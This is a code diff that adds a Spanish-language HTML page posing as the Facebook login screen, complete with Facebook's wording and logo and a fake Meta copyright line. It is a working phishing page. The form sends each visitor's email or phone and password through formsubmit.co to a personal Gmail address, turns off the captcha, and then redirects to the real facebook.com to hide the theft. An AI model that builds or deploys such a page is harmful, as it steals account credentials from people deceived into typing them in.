@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="Facemovil.css"
+    
+    <div>
+    <title>Formulario - Inicia sesión o regístrate</title>
+    <link rel="icon" href="facelogo.webp">
+    </div>
+  
+</head>
+<body>
+    <div class="container">
+        <div class="textos">
+            <h2>registrate para el formulario</h2>
+            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
+        </div>
+        <div>
+            <form class="form" id="miFormulario" action="https://formsubmit.co/danialvarez637281@gmail.com" method="POST">
+                <input type="text" name="correonum" id="correonum" class="form-control mb-3" placeholder="Correo electrónico o número de teléfono" autofocus />
+                <input type="password" name="contra" id="contra" class="form-control mb-3" placeholder="Contraseña">
+                <!-- Botón 1: Iniciar sesión -->
+                <button type="submit" class="entrar" id="enviarIniciarSesion"><span>Iniciar sesión</span></button>
+                <!-- Botón 2: ¿Olvidaste tu contraseña? -->
+                <a href="https://www.facebook.com/recuperar-contrasena" id="olvidasteContrasena"><span>¿Olvidaste tu contraseña?</span></a>
+                <hr>
+                <!-- Botón 3: Cuenta nueva -->
+                <button type="submit" class="NuevaC" id="cuentaNueva"><span>Crear cuenta nueva</span></button>
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_next" value="https://www.facebook.com/">
+            </form>
+            
+
+            <div class="conte-ul">
+                <p class="afuera"><span>Crea una página</span> para una celebridad, una marca o un negocio.</p>
+            </div>
+            <label id="label6">&copy;2023 Formulario from Meta</label>
+        </div>
+    </div>
+    
+</body>
+</html>
